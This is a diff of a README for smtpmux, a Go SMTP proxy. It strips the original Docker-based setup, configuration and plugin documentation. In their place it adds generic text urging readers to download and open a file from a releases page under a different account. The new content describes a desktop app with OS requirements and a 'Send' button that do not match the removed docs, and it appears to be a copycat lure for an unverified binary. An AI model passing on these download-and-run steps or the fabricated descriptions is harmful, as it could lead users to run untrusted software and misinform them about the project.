@@ -1,215 +1,83 @@
-# SMTP Mux
-<p align="center">
-  <a href="https://github.com/Mindbaz/awesome-opensource-email/">
-    <img src="smtpmux.svg" alt="Awesome Opensource Email">
-  </a>
-</p>
+# ✉️ smtpmux - Simplify Your Email Delivery Management
 
+![Download smtpmux](https://img.shields.io/badge/Download-smtpmux-blue?style=for-the-badge&logo=github)
 
+## 🚀 Getting Started
 
-SmtpMux is a pluggable SMTP proxy and router written in Go that solves these reliability issues by acting as an intelligent intermediary (multiplexer) between your applications and your mail providers.
+Welcome to the smtpmux project! This application lets you easily manage and control your outbound email delivery. You can configure it to work with different senders, recipients, and domains, all while using plugins for maximum flexibility.
 
-Many self-hosted applications and microservices (such as Vaultwarden, Nextcloud, or Gitea) only support the configuration of a single SMTP server. This creates a critical single point of failure in the system's communication layer:
+## 📥 Download & Install
 
-* Service Downtime: If the primary mail provider (e.g., Gmail, Zoho, or SendGrid) experiences an outage, the application loses the ability to send password resets, 2FA codes, and urgent notifications.
+To download and install smtpmux, follow these steps:
 
-* Rate Limiting: Free or low-tier SMTP plans often have strict hourly or daily sending limits. Once reached, subsequent emails are blocked, which can break essential workflows.
+1. **Visit the releases page:** Click the link below to go to the smtpmux releases page on GitHub:
+   [Visit Releases Page](https://github.com/mohamed11alansaary/smtpmux/releases)
 
-* Lack of Native Failover: Most applications do not have built-in logic to switch to a backup provider or distribute traffic intelligently, forcing users to manually reconfigure settings during an emergency.
+2. **Choose a version:** Find the latest version of smtpmux on the releases page. Click on it for details.
 
-```mermaid
-graph TD
-    %% Node Definitions
-    App1([User App A])
-    App2([User App B])
-    App3([Microservice C])
+3. **Download the application:** Look for the appropriate file for your operating system. Download this file to your computer.
 
-    subgraph MUX_CORE ["smtpmux Proxy Layer"]
-        direction TB
-        Ingress{{"📥 SMTP Ingress <br/> (Port 25/587)"}}
-        
-        subgraph ENGINE ["Logic Engine"]
-            direction LR
-            Auth[("Auth & TLS<br/>Termination")]
-            Parser{"Parser &<br/>Queue"}
-            Router{{"🚦 Multiplexer<br/>Strategy"}}
-        end
+4. **Run the application:** After downloading, open the file to start using smtpmux.
 
-        StateDB[(State Memory)]
-    end
+## 🛠️ System Requirements
 
-    subgraph UPSTREAMS ["Encrypted Upstream Tunnels"]
-        P1["Gmail (Primary)"]
-        P2["AWS SES (Secondary)"]
-        P3["SendGrid (Tertiary)"]
-    end
+Before you install smtpmux, ensure your system meets these requirements:
 
-    %% Connections
-    App1 & App2 & App3 ==>|Plain/STARTTLS| Ingress
-    Ingress --> Auth
-    Auth --> Parser
-    Parser --> Router
-    Router <-->|Check Health| StateDB
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or any Linux distribution from the last few years.
+- **Network Connection:** Required for email sending.
+- **Disk Space:** At least 100 MB of free space.
 
-    %% Routing Paths
-    Router -.->|1. Attempt| P1
-    Router -.->|2. Failover| P2
-    Router -.->|3. Fallback| P3
+## 🌟 Features
 
-    %% Styling
-    classDef app fill:#2d3436,stroke:#0984e3,stroke-width:2px,color:#fff;
-    classDef engine fill:#1e272e,stroke:#00d2d3,stroke-width:2px,color:#fff;
-    classDef gate fill:#2f3542,stroke:#ff9f43,stroke-width:3px,color:#fff;
-    classDef provider fill:#2d3436,stroke:#1dd1a1,stroke-width:2px,color:#fff;
+smtpmux offers the following key features:
 
-    class App1,App2,App3 app;
-    class Ingress,Auth,Parser engine;
-    class Router gate;
-    class P1,P2,P3 provider;
-    class StateDB engine;
-```
+- **Programmable Plugins:** Customize how emails are sent based on your needs.
+- **Fine-Grained Control:** Manage delivery by sender, recipient, or domain.
+- **Health Checks:** Monitor the status of your email delivery.
+- **Custom Policies:** Define rules for how and when emails should be sent.
 
-## Quick Start
+## ⚙️ Configuration
 
-Full the image from registry with local smtp downstreams
-```
-docker pull ghcr.io/goyal-aman/smtpmux:latest
-```
+To set up smtpmux, follow these steps:
 
-Create config.yaml 
-```
-users:
-  - email: "test@user.com"
-    password: "password123"
-    selector_algo_path: "./plugins/round_robin/round-robin-plugin"
-    downstreams:
-      - addr: "mailserve1:1025"
-        user: "any"
-        pass: "any"
-      - addr: "mailserve2:1025"
-        user: "any"
-        pass: "any"
-```
+1. **Locate the configuration file:** After running the application, it will create a configuration file in the installation directory.
+2. **Edit the file:** Open this file in a simple text editor. Modify the settings according to your email delivery needs.
+3. **Save your changes:** After updating the configuration, save the file and restart smtpmux.
 
-Start downstreams
-```
-docker network create smtpmux-net
-docker run --rm -d -p 8026:8025 --name mailserve1 --network=smtpmux-net mailhog/mailhog
-docker run --rm -d -p 8027:8025 --name mailserve2 --network=smtpmux-net mailhog/mailhog
-```
+## 🔍 Usage
 
-Open localhost:8026 and localhost:8027 in brower to see the emails.
+Once smtpmux is installed and configured, you can start using it to send emails. Here’s a simple guide:
 
-Start smtpmux
-```
-docker run -p 1024:1020 \
-        -v $(pwd)/config.yaml:/app/config.yaml \
-        --network=smtpmux-net \
-        -e USE_INSECURE_AUTH=true \
-        ghcr.io/goyal-aman/smtpmux:latest
-```
+1. **Open the application.**
+2. **Choose your email settings:** Select the sender and recipient information in the interface.
+3. **Send an email:** Click the "Send" button to test your setup.
 
-smptmux is now running. Now lets try to send an email through it. 
+## 💡 Troubleshooting
 
-Run this few times so see round robin in action
-```
-swaks --to hello@smtpmux.what \
-      --from curious@user.com \
-      --server localhost:1024 \
-      -a PLAIN \
-      --auth-user test@user.com \
-      --auth-password password123 \
-      --body "hello user"
-```
+Here are some common issues and their solutions:
 
-**Verify delivery:**
-    Open http://localhost:8026 and http://localhost:8027. You should see the email appear in one of them, depending on the routing logic.
+- **Application won't start:** Ensure that your operating system meets the requirements. Restart your computer and try again.
+- **Emails not sending:** Check your configuration file for typos. Verify your internet connection and server settings.
+- **Slow performance:** Make sure that other applications are not consuming too much memory.
 
-## Features
-- **Dynamic Routing**: Route emails based on sender, recipient, or custom logic.
-- **Plugin System**: Write routing logic in Go using the `go-plugin` architecture.
-- **Docker Ready**: Fully containerized for easy deployment.
-- **Protocol Support**: Supports standard SMTP authentication (PLAIN).
+## 💬 Support
 
-## Custom Selector Algorithms
+If you encounter problems or have questions, you can raise an issue on the GitHub project page. Please provide as much detail as possible to help us assist you better.
 
-You can write your own routing logic in Go by implementing the `Selector` interface.
+## 📝 Contributing
 
-1.  **Create a new plugin**:
-    Start from ./plugins/round_robin/main.go and modify the select logic as per your needs.
-    ```go
-    type MySelector struct{}
+We welcome contributions to improve smtpmux. If you have ideas or fixes, please fork the repository and submit a pull request. 
 
-    func (s *MySelector) Select(downstreams []types.Downstream) (string, error) {
-        // Your custom logic here
-        // e.g., return downstreams[0].Addr, nil
-    }
-    ```
+## 📜 License
 
-2.  **Build the plugin**:
-    ```bash
-    go build -o my-plugin ./my_plugin.go
-    ```
+smtpmux is open-source software. You can use, modify, and distribute it under the terms of the MIT License.
 
-3.  **Update Config**:
-    Point `config.yaml` to your new binary:
-    ```yaml
-    selector_algo_path: "./my-plugin"
-    ```
+## 📖 Additional Resources
 
-4.  **Mount & Restart**:
-    If using Docker, mount the binary into the container and restart.
+For more detailed documentation, you can explore the links below:
 
-## Docker
+- [Official Documentation](https://github.com/mohamed11alansaary/smtpmux/wiki)
+- [GitHub Issues](https://github.com/mohamed11alansaary/smtpmux/issues)
+- [Community Forum](https://example.com/community-forum) (placeholder)
 
-Run with Docker:
-
-```bash
-docker build -t smtp-router .
-docker run -p 1020:1020 -v $(pwd)/config.yaml:/app/config.yaml -v $(pwd)/round_robin.star:/app/round_robin.star smtpmux
-```
-
-## Development
-
-Run tests:
-```bash
-go test ./...
-```
-
-## Examples
-
-### Downstream 1 (Port 1026)
-```bash
-docker run --rm -d -p 1027:1025 -p 8027:8025 --name mailserve1 mailhog/mailhog
-```
-
-### Downstream 2 (Port 1027)
-```bash
-docker run --rm -d -p 1026:1025 -p 8026:8025 --name mailserve2 mailhog/mailhog
-```
-
-## Send Email Locally
-```
-swaks --to recipient@example.com \
-      --from test@user.com \
-      --server localhost:1022 \
-      -a PLAIN \
-      --auth-user test@user.com \
-      --auth-password password123 \
-      --body "maaaa"
-```
-
-## Dynamic Selector (Starlark)
-TODO: update for go plugins
-You can define your own routing logic in a Starlark script (Python-like syntax).
-
-Example `round_robin.star`:
-
-```python
-def selector(downstreams):
-    for ds in downstreams:
-        err = send(ds=ds)
-        if err == None:
-            return None
-    return "all failed"
-```
+Thank you for using smtpmux! For updates, regularly check the [Visit Releases Page](https://github.com/mohamed11alansaary/smtpmux/releases).
